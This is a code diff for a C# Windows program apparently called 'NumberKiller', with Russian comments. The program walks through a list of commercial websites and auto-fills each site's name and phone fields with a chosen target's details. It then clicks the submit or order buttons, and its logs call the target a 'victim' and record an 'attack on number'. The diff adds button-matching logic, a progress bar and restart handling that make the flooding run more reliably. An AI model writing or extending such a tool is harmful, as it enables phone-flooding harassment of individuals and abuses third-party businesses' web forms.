@@ -6,12 +6,20 @@ using System.IO;
 
 namespace NumberKiller
 {
+
     public partial class app_UI : Form
     {
-
         // БЛОК ИНИЦИЛИЗАЦИИ
-/******************************************************************************************************************************************/
-        // Объявляем запись в файл и задаем путь по умлочанию для файла
+        /******************************************************************************************************************************************/
+        public const int WM_NCLBUTTONDOWN = 0xA1;
+        public const int HT_CAPTION = 0x2;
+
+        [System.Runtime.InteropServices.DllImportAttribute("user32.dll")]
+        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
+        [System.Runtime.InteropServices.DllImportAttribute("user32.dll")]
+        public static extern bool ReleaseCapture();
+
+        // Объявляем экземпляр класса потока записи в файл 
         private StreamWriter file;
 
         // Обьявляем экзмпляры классов для работы с информацей о страницах 
@@ -24,8 +32,8 @@ namespace NumberKiller
         private String name;
 
         // Поля - счетчики
-        private int page_number = 0;
-        private int count_of_pages = 0;
+        private int page_number;
+        private int count_of_pages ;
 
         // Объявляем листы для хранения значений полей HTML кода для ввода имени,
         // Номера телефона и кнопки "подтвердить" 
@@ -48,9 +56,6 @@ namespace NumberKiller
             URLs.Add("http://hq.shopent.net/");
             URLs.Add("http://kvlow.meta-complex.com/");
 
-            // Иницилизация количества сайтов
-            count_of_pages = URLs.Count;
-
             // Иницилизация списка атрибутов для ввода имени в текстовое поле
             name_field.Add("name");
             name_field.Add("fio");
@@ -65,6 +70,9 @@ namespace NumberKiller
 
             // Объявление списка атрибутов для нажатия кнопки
             button.Add("input");
+            button.Add("button order-btn ifr_button");
+
+            progress_bar.Maximum = URLs.Count;
         }
 
         // БЛОК ОБРАБОТКИ ФОРМЫ
@@ -73,6 +81,12 @@ namespace NumberKiller
         // Обработчик нажатия на кнопку старт
         private void start_button_Click(object sender, EventArgs e)
         {
+            // Сброс номера страницы
+            page_number = 0;
+
+            // Иницилизация количества сайтов
+            count_of_pages = URLs.Count;
+
             // Получаем значения из полей ввода и записываем в переменные          
             name = name_textbox.Text;
 
@@ -110,6 +124,7 @@ namespace NumberKiller
             {
                 // Логируем информацию о жертве
                 LogSystem(2);
+                start_button.Enabled = false;
                 ChangePage(page_number);
             }
         }
@@ -133,13 +148,30 @@ namespace NumberKiller
             System.Diagnostics.Process.Start(@"C:\Users\User\Desktop\logs.txt");
         }
 
+        // Обработка кнопки выхода 
+        private void exit_button_Click(object sender, EventArgs e)
+        {
+            Application.Exit();
+        }
+
+        // Обработка перемещения окна
+        private void app_UI_MouseDown(object sender, MouseEventArgs e)
+        {
+            if (e.Button == MouseButtons.Left)
+            {
+                ReleaseCapture();
+                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
+            }
+        }
+
         // БЛОК ВНУТРЕННЕЙ ЛОГИКИ
-/******************************************************************************************************************************************/
+        /******************************************************************************************************************************************/
 
         // Метод смены страницы
         private void ChangePage(int page)
         {
             LogSystem(0);
+            progress_bar.Value = page + 1;
 
             // Блок проверки валидности страницы
             urlCheck = new Uri(URLs[page]);
@@ -189,13 +221,12 @@ namespace NumberKiller
         // Метод автозаполнения полей и нажатия на кнопки на сайтах
         private void Auto_fill()
         {
-
             // Перебор страницы и поиск поля ввода имени 
             // Если найденый атрибут NAME у тега INPUT совпадает с одним из элементом в списке возможных вариантов
             // То заполняем поле в форме нашей переменной 
             foreach (HtmlElement htmlElement in webBrowser.Document.GetElementsByTagName("input"))
                 foreach (String nameElement in name_field)
-                    if (htmlElement.GetAttribute("name").Equals(nameElement)) 
+                    if (htmlElement.GetAttribute("name").Equals(nameElement))
                         htmlElement.InnerText = name;
 
             foreach (HtmlElement htmlElement in webBrowser.Document.GetElementsByTagName("input"))
@@ -205,20 +236,28 @@ namespace NumberKiller
 
             foreach (HtmlElement htmlElement in webBrowser.Document.GetElementsByTagName("input"))
                 foreach (String buttonElement in button)
-                    if (htmlElement.GetAttribute("type").Equals("submit"))
+                    if (htmlElement.GetAttribute("type").Equals(buttonElement))
                         htmlElement.InvokeMember("click"); // Производим виртуальное нажатие кнопки
 
             foreach (HtmlElement htmlElement in webBrowser.Document.GetElementsByTagName("button"))
                 foreach (String buttonElement in button)
-                    if (htmlElement.GetAttribute("type").Equals("submit"))                     
+                    if (htmlElement.GetAttribute("type").Equals(buttonElement) || htmlElement.GetAttribute("class").Equals(buttonElement))                     
                         htmlElement.InvokeMember("click"); // Производим виртуальное нажатие кнопки
-
+         
             // Логируем выполнение 
             LogSystem(-1);
 
             // Стоп сигнал если количество страниц будет равно нулю
-            if (count_of_pages !=0)
-               ChangePage(page_number);
+            if (count_of_pages != 0)
+                ChangePage(page_number);
+
+            // Сброс полоски прогресса и включение кнопки
+            else if (count_of_pages == 0)
+            {
+                start_button.Enabled = true;
+                progress_bar.Value = 0;
+                LogSystem(3);
+            }
         }
 
         // Лог система в качестве вызываемого метода
@@ -236,6 +275,9 @@ namespace NumberKiller
             
             switch (status) // Выборка по коду статуса и запись в файл информации
             {
+                case -2:
+                    file.Write("-Автор софта: github.com/acr0matic");
+                    break;
                 case -1:
                     file.Write("- Данные отправлены");
                     break;
@@ -247,6 +289,9 @@ namespace NumberKiller
                     break;
                 case 2:
                     file.Write("- Атака на номер: " + phone + ", Имя: " + name);
+                    break;               
+                case 3:
+                    file.Write("- Проход завершен успешно.");
                     break;
                 case 200:
                     file.Write("- Поле для ввода имени не найдено");
@@ -264,6 +309,6 @@ namespace NumberKiller
 
             // Закрываем поток записи в файл для того чтобы изменения были внесенны в файл
             file.Close();
-        }      
+        }    
     }
 }
